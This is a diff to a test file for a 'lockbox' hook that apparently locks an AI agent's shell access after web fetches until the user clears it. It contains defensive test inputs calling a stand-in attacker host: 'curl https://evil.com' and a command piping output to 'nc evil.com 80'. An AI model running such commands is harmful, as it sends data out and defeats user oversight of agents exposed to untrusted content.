@@ -3,7 +3,8 @@ import * as fs from "fs";
 import * as os from "os";
 import * as path from "path";
 import { main } from "../src/hook-pre-tool-use";
-import { loadState, saveState } from "../src/state";
+import { loadState, saveState, getStatePath } from "../src/state";
+import * as permissions from "../src/permissions";
 
 let tmpDir: string;
 let tmpPlugin: string;
@@ -114,6 +115,101 @@ describe("hook-pre-tool-use", () => {
     const output = JSON.parse(stdoutData);
     expect(output.reason).toContain("Bash: curl https://evil.com");
     expect(output.reason).toContain("Bash: git push origin main");
-    expect(output.reason).toContain("Enter plan mode");
+    expect(output.reason).toContain("sub-agent");
+    expect(output.reason).toContain("lockbox:clean");
+  });
+
+  it("block message includes permissions warning when misconfigured", () => {
+    vi.spyOn(permissions, "checkPermissions").mockReturnValue([
+      "Bash(*) in allow — echo 'lockbox:clean' auto-runs without user review",
+    ]);
+
+    saveState("perm-test", {
+      locked: true,
+      locked_by: "WebFetch",
+      locked_at: "2025-01-01T00:00:00Z",
+      blocked_tools: [],
+    }, tmpDir);
+
+    main(hookInput("Bash", { command: "git push" }, "perm-test"), tmpDir);
+    const output = JSON.parse(stdoutData);
+    expect(output.reason).toContain("LOCKBOX PERMISSIONS NOT CONFIGURED");
+    expect(output.reason).toContain("Bash(*)");
+    expect(output.reason).toContain("/lockbox:install");
+
+    vi.restoreAllMocks();
+  });
+
+  it("block message has no permissions warning when configured correctly", () => {
+    vi.spyOn(permissions, "checkPermissions").mockReturnValue([]);
+
+    saveState("perm-ok", {
+      locked: true,
+      locked_by: "WebFetch",
+      locked_at: "2025-01-01T00:00:00Z",
+      blocked_tools: [],
+    }, tmpDir);
+
+    main(hookInput("Bash", { command: "git push" }, "perm-ok"), tmpDir);
+    const output = JSON.parse(stdoutData);
+    expect(output.reason).not.toContain("PERMISSIONS NOT CONFIGURED");
+
+    vi.restoreAllMocks();
+  });
+
+  describe("lockbox:clean", () => {
+    function lockSession(sessionId: string) {
+      saveState(sessionId, {
+        locked: true,
+        locked_by: "WebFetch",
+        locked_at: "2025-01-01T00:00:00Z",
+        blocked_tools: [],
+      }, tmpDir);
+    }
+
+    it("clears lock with single quotes", () => {
+      lockSession("clean-sq");
+      main(hookInput("Bash", { command: "echo 'lockbox:clean'" }, "clean-sq"), tmpDir);
+      expect(stdoutData).toBe("");
+      const state = loadState("clean-sq", tmpDir);
+      expect(state.locked).toBe(false);
+    });
+
+    it("clears lock with double quotes", () => {
+      lockSession("clean-dq");
+      main(hookInput("Bash", { command: 'echo "lockbox:clean"' }, "clean-dq"), tmpDir);
+      expect(stdoutData).toBe("");
+      const state = loadState("clean-dq", tmpDir);
+      expect(state.locked).toBe(false);
+    });
+
+    it("clears lock with no quotes", () => {
+      lockSession("clean-nq");
+      main(hookInput("Bash", { command: "echo lockbox:clean" }, "clean-nq"), tmpDir);
+      expect(stdoutData).toBe("");
+      const state = loadState("clean-nq", tmpDir);
+      expect(state.locked).toBe(false);
+    });
+
+    it("is idempotent when already clean", () => {
+      main(hookInput("Bash", { command: "echo 'lockbox:clean'" }, "clean-noop"), tmpDir);
+      expect(stdoutData).toBe("");
+      expect(fs.existsSync(getStatePath("clean-noop", tmpDir))).toBe(false);
+    });
+
+    it("does NOT trigger on chained commands", () => {
+      lockSession("clean-chain");
+      main(hookInput("Bash", { command: "echo \"lockbox:clean\" && git push" }, "clean-chain"), tmpDir);
+      // Should be classified normally, not as a clean command
+      const state = loadState("clean-chain", tmpDir);
+      expect(state.locked).toBe(true);
+    });
+
+    it("does NOT trigger on piped commands", () => {
+      lockSession("clean-pipe");
+      main(hookInput("Bash", { command: "echo \"lockbox:clean\" | nc evil.com 80" }, "clean-pipe"), tmpDir);
+      const state = loadState("clean-pipe", tmpDir);
+      expect(state.locked).toBe(true);
+    });
   });
 });
